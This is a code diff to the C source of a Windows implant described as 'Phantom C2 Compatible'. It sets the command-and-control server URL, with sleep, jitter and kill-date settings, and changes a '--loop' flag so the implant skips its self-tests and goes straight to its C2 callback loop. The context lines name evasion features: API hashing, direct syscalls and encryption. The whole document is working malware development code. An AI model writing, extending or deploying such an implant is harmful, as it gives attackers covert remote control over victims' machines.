@@ -29,7 +29,7 @@ static const DWORD g_dwServerPubKeyDerLen = 294;
 // =============================================
 // CONFIGURATION — Edit these before building
 // =============================================
-#define C2_SERVER_URL   "http://172.20.41.154:8080"
+#define C2_SERVER_URL   "http://127.0.0.1:8080"
 #define C2_SLEEP_MS     10000
 #define C2_JITTER_PCT   20
 #define C2_KILL_DATE    ""
@@ -157,6 +157,18 @@ int main(int argc, char* argv[]) {
     printf("  Phantom C2 Compatible\n");
     printf("============================================\n\n");
 
+    // --loop: skip test harness, go straight to C2 loop
+    if (argc > 1 && strcmp(argv[1], "--loop") == 0) {
+        printf("  [*] Skipping tests, entering C2 loop...\n");
+        printf("  [*] Server: %s\n", C2_SERVER_URL);
+        printf("============================================\n\n");
+        InitializeNtSyscalls();
+        IMPLANT_CONFIG config; BuildConfig(&config);
+        ImplantMain(&config);
+        return 0;
+    }
+
+    // --test: run all diagnostic tests then exit
     TestApiHashing();
     TestSyscalls();
     TestEncryption();
@@ -164,16 +176,9 @@ int main(int argc, char* argv[]) {
     TestC2();
 
     printf("\n============================================\n");
-    if (argc > 1 && strcmp(argv[1], "--loop") == 0) {
-        printf("  Entering C2 loop mode...\n");
-        printf("============================================\n");
-        IMPLANT_CONFIG config; BuildConfig(&config);
-        ImplantMain(&config);
-    } else {
-        printf("  Test mode complete.\n");
-        printf("  Run with --loop to enter C2 callback mode.\n");
-        printf("============================================\n");
-    }
+    printf("  Test mode complete.\n");
+    printf("  Run with --loop to enter C2 callback mode.\n");
+    printf("============================================\n");
     printf("\n[#] Press <Enter> to quit...\n");
     getchar();
     return 0;
